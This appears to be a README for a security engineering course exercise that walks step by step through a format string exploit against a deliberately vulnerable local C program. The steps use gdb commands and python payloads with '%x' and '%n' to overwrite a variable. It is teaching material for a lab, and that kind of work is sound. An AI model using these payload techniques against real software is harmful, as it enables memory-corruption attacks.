# sec_engineering_exercises

## Format string exploitation example (Section 2.5)
1. Create a c file like, for example with vi: `vi vuln_s`
   Content for the file: [vuln_s.c](vuln_s.c) 

2. Set environment flags
`export CFLAGS="-m32 -fno-stack-protector -z execstack -fno-PIE -no-pie -g -std=c99"`
3. Compile the file with GCC to create an executable object
'''
    gcc -g -o vuln vuln_s.c -m32 -fno-stack-protector -z execstack -fno-PIE -no-pie -g
'''
4. Execute the file to ensure its working
'''
   ./vuln test
'''
Should return:

5. Opend program in debugger
'''
    gdb vuln
'''
6. Run program with '%x' whitch will return data from the stack - the hexadecimal value of stack
'''
    run %x
'''
Should return: ![Alt text](image-1.png)
7. Add a brakepoint at line 16 (where the call is made from the main fucntion to the vuln function)
'''
    break 14
'''
8. Run program again
'''
    run %x
'''
Shoudl return: ![Alt text](image-2.png)
9. Check the contect on the %esp registers by running
'''
    x/100x %esp
'''
Should return:
    ![Alt text](image-3.png)
10. So the str is located that 0xbffff789 and the '%x' value (0x4020e3fc) at 0xbffff550
    The distance between str and %x is 0xbffff789 - 0xbffff550 = 569 (https://www.calculator.net/hex-calculator.html?number1=bffff789&c2op=-&number2=bffff550&calctype=op&x=50&y=20)
    We want a number that is devisible by 4 (4 bytes) so will round 569 to 572 and then 572 / 4 = 143
    That means that the 'target' varaible is around 143 positions away from the start of the stack
    We can run a command that will pring us hexadecimal values up 143 places 
'''
11. Try and fail
    Try 143 spaces and see if you can see 414141 (represention of AAAA)
'''
     run `(python -c 'print "AAAA" + ".%x." * 143+"%x"')`
'''
Output: ![Alt text](image-4.png)
    Try to increase 143 to 146
'''
     run `(python -c 'print "AAAA" + ".%x." * 146+"%x"')`
'''
![Alt text](image-5.png)
    Ok, I can now see the hexadecima representaion of AAAA but it is not at the end of the output, I need to get rid of the '00'

    Try with adding extra padding (BB)
'''
    run `(python -c 'print "AAAA" +"BBB"+ "%x." * 146+"%x"')`
'''
   ![Alt text](image-8.png)
Ok, my string is now pointing to the hexadecimal represention of 'AAAA'

12. Replace AAAA with the address of the 'target' variable 
    To find the target variable type: '''p &target '''
    The output should be: ![Alt text](image-7.png)

13. Do the hack 
- Replace the 'AAAA' in the run commant with the address (its read from the back for fun)
- replace last '%x' with '%n' (x is reading and n is writing)
'''
    run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
'''
Output: ![Alt text](image-9.png)
14. See value of taget chaning
- add break at line 5
- add break at line 15
- run run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
- on first breakpoint type: print target - the value should be 0 
- type: '''next'''
- type: '''next'''
- print target - the value should be changed
![Alt text](image-10.png)




